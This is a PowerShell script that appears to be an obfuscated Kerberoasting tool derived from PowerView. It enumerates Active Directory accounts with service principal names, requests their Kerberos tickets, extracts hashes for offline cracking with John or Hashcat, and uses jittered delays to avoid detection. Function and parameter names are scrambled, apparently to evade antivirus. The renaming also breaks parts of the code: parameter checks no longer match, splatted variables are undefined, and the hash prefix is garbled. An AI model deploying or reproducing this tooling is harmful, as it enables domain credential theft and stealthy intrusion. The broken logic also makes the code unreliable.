function uninstalled {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FOtyMZfO99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $cVvwUQov99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $hASPgThm99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $YOIOWNjy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $BOLqsAXu99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GpzvfOaw99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $rXMACERZ99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rhEFHxGB99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $byAqCbVI99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $HKIoJSsx99,
        [Switch]
        $FJGsxfBN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $OyrmJceX99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $dRSKgjqa99 = $FOtyMZfO99
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $GLbSLRsy99 = sidestroke -OyrmJceX99 $OyrmJceX99
            }
            else {
                $GLbSLRsy99 = sidestroke
            }
            $dRSKgjqa99 = $GLbSLRsy99.Name
        }
        if (-not $PSBoundParameters['Server']) {
            try {
                if ($GLbSLRsy99) {
                    $dNwJTibI99 = $GLbSLRsy99.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $dNwJTibI99 = ((sidestroke -OyrmJceX99 $OyrmJceX99).PdcRoleOwner).Name
                }
                else {
                    $dNwJTibI99 = ((sidestroke).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[uninstalled] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $dNwJTibI99 = $GpzvfOaw99
        }
        $LCXyiDMe99 = 'LDAP://'
        if ($dNwJTibI99 -and ($dNwJTibI99.Trim() -ne '')) {
            $LCXyiDMe99 += $dNwJTibI99
            if ($dRSKgjqa99) {
                $LCXyiDMe99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $LCXyiDMe99 += $BOLqsAXu99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($YOIOWNjy99 -Match '^GC://') {
                $DN = $YOIOWNjy99.ToUpper().Trim('/')
                $LCXyiDMe99 = ''
            }
            else {
                if ($YOIOWNjy99 -match '^LDAP://') {
                    if ($YOIOWNjy99 -match "LDAP://.+/.+") {
                        $LCXyiDMe99 = ''
                        $DN = $YOIOWNjy99
                    }
                    else {
                        $DN = $YOIOWNjy99.SubString(7)
                    }
                }
                else {
                    $DN = $YOIOWNjy99
                }
            }
        }
        else {
            if ($dRSKgjqa99 -and ($dRSKgjqa99.Trim() -ne '')) {
                $DN = "DC=$($dRSKgjqa99.Replace('.', ',DC='))"
            }
        }
        $LCXyiDMe99 += $DN
        Write-Verbose "[uninstalled] search string: $LCXyiDMe99"
        if ($OyrmJceX99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[uninstalled] Using alternate credentials for LDAP connection"
            $GLbSLRsy99 = New-Object DirectoryServices.DirectoryEntry($LCXyiDMe99, $OyrmJceX99.UserName, $OyrmJceX99.GetNetworkCredential().Password)
            $edXNEqLn99 = New-Object System.DirectoryServices.DirectorySearcher($GLbSLRsy99)
        }
        else {
            $edXNEqLn99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$LCXyiDMe99)
        }
        $edXNEqLn99.PageSize = $rhEFHxGB99
        $edXNEqLn99.SearchScope = $rXMACERZ99
        $edXNEqLn99.CacheResults = $False
        $edXNEqLn99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $edXNEqLn99.ServerTimeLimit = $byAqCbVI99
        }
        if ($PSBoundParameters['Tombstone']) {
            $edXNEqLn99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $edXNEqLn99.filter = $cVvwUQov99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $edXNEqLn99.SecurityMasks = Switch ($HKIoJSsx99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $pSCskSgq99 = $hASPgThm99| ForEach-Object { $_.Split(',') }
            $Null = $edXNEqLn99.PropertiesToLoad.AddRange(($pSCskSgq99))
        }
        $edXNEqLn99
    }
}
function macrons {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $hASPgThm99
    )
    $qjQLEcms99 = @{}
    $hASPgThm99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $qjQLEcms99[$_] = $hASPgThm99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $qjQLEcms99[$_] = $hASPgThm99[$_][0] -as $PSJZmNHi99
            }
            elseif ($_ -eq 'samaccounttype') {
                $qjQLEcms99[$_] = $hASPgThm99[$_][0] -as $OiGJhORR99
            }
            elseif ($_ -eq 'objectguid') {
                $qjQLEcms99[$_] = (New-Object Guid (,$hASPgThm99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $qjQLEcms99[$_] = $hASPgThm99[$_][0] -as $nhLLSVOz99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $sQMEHFkG99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $hASPgThm99[$_][0], 0
                if ($sQMEHFkG99.Owner) {
                    $qjQLEcms99['Owner'] = $sQMEHFkG99.Owner
                }
                if ($sQMEHFkG99.Group) {
                    $qjQLEcms99['Group'] = $sQMEHFkG99.Group
                }
                if ($sQMEHFkG99.DiscretionaryAcl) {
                    $qjQLEcms99['DiscretionaryAcl'] = $sQMEHFkG99.DiscretionaryAcl
                }
                if ($sQMEHFkG99.SystemAcl) {
                    $qjQLEcms99['SystemAcl'] = $sQMEHFkG99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($hASPgThm99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $qjQLEcms99[$_] = "NEVER"
                }
                else {
                    $qjQLEcms99[$_] = [datetime]::fromfiletime($hASPgThm99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($hASPgThm99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $hASPgThm99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $qjQLEcms99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $qjQLEcms99[$_] = ([datetime]::FromFileTime(($hASPgThm99[$_][0])))
                }
            }
            elseif ($hASPgThm99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $hASPgThm99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $qjQLEcms99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[macrons] error: $_"
                    $qjQLEcms99[$_] = $Prop[$_]
                }
            }
            elseif ($hASPgThm99[$_].count -eq 1) {
                $qjQLEcms99[$_] = $hASPgThm99[$_][0]
            }
            else {
                $qjQLEcms99[$_] = $hASPgThm99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $qjQLEcms99
    }
    catch {
        Write-Warning "[macrons] Error parsing LDAP properties : $_"
    }
}
function sidestroke {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FOtyMZfO99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $OyrmJceX99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[sidestroke] Using alternate credentials for sidestroke'
            if ($PSBoundParameters['Domain']) {
                $dRSKgjqa99 = $FOtyMZfO99
            }
            else {
                $dRSKgjqa99 = $OyrmJceX99.GetNetworkCredential().Domain
                Write-Verbose "[sidestroke] Extracted domain '$dRSKgjqa99' from -OyrmJceX99"
            }
            $cHaRJGHF99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $dRSKgjqa99, $OyrmJceX99.UserName, $OyrmJceX99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($cHaRJGHF99)
            }
            catch {
                Write-Verbose "[sidestroke] The specified domain '$dRSKgjqa99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $cHaRJGHF99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $FOtyMZfO99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($cHaRJGHF99)
            }
            catch {
                Write-Verbose "[sidestroke] The specified domain '$FOtyMZfO99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[sidestroke] Error retrieving the current domain: $_"
            }
        }
    }
}
function extinguishes {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $TIUSAvkd99 = 'John',
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $SZkqnOnq99 = .3,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $OyrmJceX99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $qoSrkMQn99 = Invoke-UserImpersonation -OyrmJceX99 $OyrmJceX99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $XCsVpHEW99 = $User
        }
        else {
            $XCsVpHEW99 = $SPN
        }
	
	$lXNxtZGD99 = New-Object System.Random
        ForEach ($Object in $XCsVpHEW99) {
            if ($PSBoundParameters['User']) {
                $PtuzkofO99 = $Object.ServicePrincipalName
                $CQSeDAFv99 = $Object.SamAccountName
                $gkQpdrYi99 = $Object.DistinguishedName
            }
            else {
                $PtuzkofO99 = $Object
                $CQSeDAFv99 = 'UNKNOWN'
                $gkQpdrYi99 = 'UNKNOWN'
            }
            if ($PtuzkofO99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $PtuzkofO99 = $PtuzkofO99[0]
            }
            try {
                $sLFYJuJd99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $PtuzkofO99
            }
            catch {
                Write-Warning "[extinguishes] Error requesting ticket for SPN '$PtuzkofO99' from user '$gkQpdrYi99' : $_"
            }
            if ($sLFYJuJd99) {
                $PeekvBaE99 = $sLFYJuJd99.GetRequest()
            }
            if ($PeekvBaE99) {
                $Out = New-Object PSObject
                $xGUKwIZi99 = [System.BitConverter]::ToString($PeekvBaE99) -replace '-'
                if($xGUKwIZi99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $ZngrsZcU99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $zkabTAYW99 = $Matches.DataToEnd.Substring(0,$ZngrsZcU99*2)
                    if($Matches.DataToEnd.Substring($ZngrsZcU99*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($sLFYJuJd99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($PeekvBaE99).Replace('-',''))
                    } else {
                        $Hash = "$($zkabTAYW99.Substring(0,32))`$$($zkabTAYW99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($sLFYJuJd99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($PeekvBaE99).Replace('-',''))
                }
                if($Hash) {
                    if ($TIUSAvkd99 -match 'John') {
                        $fLyXahHU99 = "`$bVRUHdFO99`$$($sLFYJuJd99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($gkQpdrYi99 -ne 'UNKNOWN') {
                            $UTHRpJqU99 = $gkQpdrYi99.SubString($gkQpdrYi99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $UTHRpJqU99 = 'UNKNOWN'
                        }
                        $fLyXahHU99 = "`$bVRUHdFO99`$$($Etype)`$*$CQSeDAFv99`$$UTHRpJqU99`$$($sLFYJuJd99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $fLyXahHU99
                }
                $Out | Add-Member Noteproperty 'SamAccountName' $CQSeDAFv99
                $Out | Add-Member Noteproperty 'DistinguishedName' $gkQpdrYi99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $sLFYJuJd99.ServicePrincipalName
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
            }
            Start-Sleep -Seconds $lXNxtZGD99.Next((1-$SZkqnOnq99)*$Delay, (1+$SZkqnOnq99)*$Delay)
        }
    }
    END {
        if ($qoSrkMQn99) {
            Invoke-RevertToSelf -TokenHandle $qoSrkMQn99
        }
    }
}
function mangroves {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $DfdIDHTE99,
        [Switch]
        $SPN,
        [Switch]
        $TfKKtRgB99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $aaLdvJmZ99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $VcrILxeZ99,
        [Switch]
        $tGjjoFLh99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $RCTdJQby99,
        [ValidateNotNullOrEmpty()]
        [String]
        $FOtyMZfO99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $cVvwUQov99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $hASPgThm99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $YOIOWNjy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GpzvfOaw99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $rXMACERZ99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rhEFHxGB99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $byAqCbVI99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $HKIoJSsx99,
        [Switch]
        $FJGsxfBN99,
        [Alias('ReturnOne')]
        [Switch]
        $KtMnHTUi99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $OyrmJceX99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $maMuRbzf99 = @{}
        if ($PSBoundParameters['Domain']) { $maMuRbzf99['Domain'] = $FOtyMZfO99 }
        if ($PSBoundParameters['Properties']) { $maMuRbzf99['Properties'] = $hASPgThm99 }
        if ($PSBoundParameters['SearchBase']) { $maMuRbzf99['SearchBase'] = $YOIOWNjy99 }
        if ($PSBoundParameters['Server']) { $maMuRbzf99['Server'] = $GpzvfOaw99 }
        if ($PSBoundParameters['SearchScope']) { $maMuRbzf99['SearchScope'] = $rXMACERZ99 }
        if ($PSBoundParameters['ResultPageSize']) { $maMuRbzf99['ResultPageSize'] = $rhEFHxGB99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $maMuRbzf99['ServerTimeLimit'] = $byAqCbVI99 }
        if ($PSBoundParameters['SecurityMasks']) { $maMuRbzf99['SecurityMasks'] = $HKIoJSsx99 }
        if ($PSBoundParameters['Tombstone']) { $maMuRbzf99['Tombstone'] = $FJGsxfBN99 }
        if ($PSBoundParameters['Credential']) { $maMuRbzf99['Credential'] = $OyrmJceX99 }
        $wTwYqRZY99 = uninstalled @SearcherArguments
    }
    PROCESS {
        if ($wTwYqRZY99) {
            $GosSSwFf99 = ''
            $yLceqLQF99 = ''
            $DfdIDHTE99 | Where-Object {$_} | ForEach-Object {
                $KGGoPoqr99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($KGGoPoqr99 -match '^S-1-') {
                    $GosSSwFf99 += "(objectsid=$KGGoPoqr99)"
                }
                elseif ($KGGoPoqr99 -match '^CN=') {
                    $GosSSwFf99 += "(distinguishedname=$KGGoPoqr99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $cdAygVbP99 = $KGGoPoqr99.SubString($KGGoPoqr99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[mangroves] Extracted domain '$cdAygVbP99' from '$KGGoPoqr99'"
                        $maMuRbzf99['Domain'] = $cdAygVbP99
                        $wTwYqRZY99 = uninstalled @SearcherArguments
                        if (-not $wTwYqRZY99) {
                            Write-Warning "[mangroves] Unable to retrieve domain searcher for '$cdAygVbP99'"
                        }
                    }
                }
                elseif ($KGGoPoqr99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GKmaVYTp99 = (([Guid]$KGGoPoqr99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $GosSSwFf99 += "(objectguid=$GKmaVYTp99)"
                }
                elseif ($KGGoPoqr99.Contains('\')) {
                    $gzWzyOOp99 = $KGGoPoqr99.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($gzWzyOOp99) {
                        $UTHRpJqU99 = $gzWzyOOp99.SubString(0, $gzWzyOOp99.IndexOf('/'))
                        $CHKucLET99 = $KGGoPoqr99.Split('\')[1]
                        $GosSSwFf99 += "(samAccountName=$CHKucLET99)"
                        $maMuRbzf99['Domain'] = $UTHRpJqU99
                        Write-Verbose "[mangroves] Extracted domain '$UTHRpJqU99' from '$KGGoPoqr99'"
                        $wTwYqRZY99 = uninstalled @SearcherArguments
                    }
                }
                else {
                    $GosSSwFf99 += "(samAccountName=$KGGoPoqr99)"
                }
            }
            if ($GosSSwFf99 -and ($GosSSwFf99.Trim() -ne '') ) {
                $yLceqLQF99 += "(|$GosSSwFf99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[mangroves] Searching for non-null service principal names'
                $yLceqLQF99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[mangroves] Searching for users who can be delegated'
                $yLceqLQF99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[mangroves] Searching for users who are sensitive and not trusted for delegation'
                $yLceqLQF99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[mangroves] Searching for adminCount=1'
                $yLceqLQF99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[mangroves] Searching for users that are trusted to authenticate for other principals'
                $yLceqLQF99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[mangroves] Searching for user accounts that do not require kerberos preauthenticate'
                $yLceqLQF99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[mangroves] Using additional LDAP filter: $cVvwUQov99"
                $yLceqLQF99 += "$cVvwUQov99"
            }
            $JxmQPgoY99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $rGtZumoL99 = $_.Substring(4)
                    $uezMzwSk99 = [Int]($nhLLSVOz99::$rGtZumoL99)
                    $yLceqLQF99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$uezMzwSk99))"
                }
                else {
                    $uezMzwSk99 = [Int]($nhLLSVOz99::$_)
                    $yLceqLQF99 += "(userAccountControl:1.2.840.113556.1.4.803:=$uezMzwSk99)"
                }
            }
            $wTwYqRZY99.filter = "(&(samAccountType=805306368)$yLceqLQF99)"
            Write-Verbose "[mangroves] filter string: $($wTwYqRZY99.filter)"
            if ($PSBoundParameters['FindOne']) { $YFQxBmTa99 = $wTwYqRZY99.FindOne() }
            else { $YFQxBmTa99 = $wTwYqRZY99.FindAll() }
            $YFQxBmTa99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = macrons -hASPgThm99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($YFQxBmTa99) {
                try { $YFQxBmTa99.dispose() }
                catch {
                    Write-Verbose "[mangroves] Error disposing of the Results object: $_"
                }
            }
            $wTwYqRZY99.dispose()
        }
    }
}
function indispensables {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $DfdIDHTE99,
        [ValidateNotNullOrEmpty()]
        [String]
        $FOtyMZfO99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $cVvwUQov99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $YOIOWNjy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GpzvfOaw99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $rXMACERZ99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rhEFHxGB99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $byAqCbVI99,
        [Switch]
        $FJGsxfBN99,
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $SZkqnOnq99 = .3,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $TIUSAvkd99 = 'John',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $OyrmJceX99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $ylwgrUpf99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $ylwgrUpf99['Domain'] = $FOtyMZfO99 }
        if ($PSBoundParameters['LDAPFilter']) { $ylwgrUpf99['LDAPFilter'] = $cVvwUQov99 }
        if ($PSBoundParameters['SearchBase']) { $ylwgrUpf99['SearchBase'] = $YOIOWNjy99 }
        if ($PSBoundParameters['Server']) { $ylwgrUpf99['Server'] = $GpzvfOaw99 }
        if ($PSBoundParameters['SearchScope']) { $ylwgrUpf99['SearchScope'] = $rXMACERZ99 }
        if ($PSBoundParameters['ResultPageSize']) { $ylwgrUpf99['ResultPageSize'] = $rhEFHxGB99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ylwgrUpf99['ServerTimeLimit'] = $byAqCbVI99 }
        if ($PSBoundParameters['Tombstone']) { $ylwgrUpf99['Tombstone'] = $FJGsxfBN99 }
        if ($PSBoundParameters['Credential']) { $ylwgrUpf99['Credential'] = $OyrmJceX99 }
        if ($PSBoundParameters['Credential']) {
            $qoSrkMQn99 = Invoke-UserImpersonation -OyrmJceX99 $OyrmJceX99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $ylwgrUpf99['Identity'] = $DfdIDHTE99 }
        mangroves @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | extinguishes -Delay $Delay -TIUSAvkd99 $TIUSAvkd99 -SZkqnOnq99 $SZkqnOnq99
    }
    END {
        if ($qoSrkMQn99) {
            Invoke-RevertToSelf -TokenHandle $qoSrkMQn99
        }
    }
}
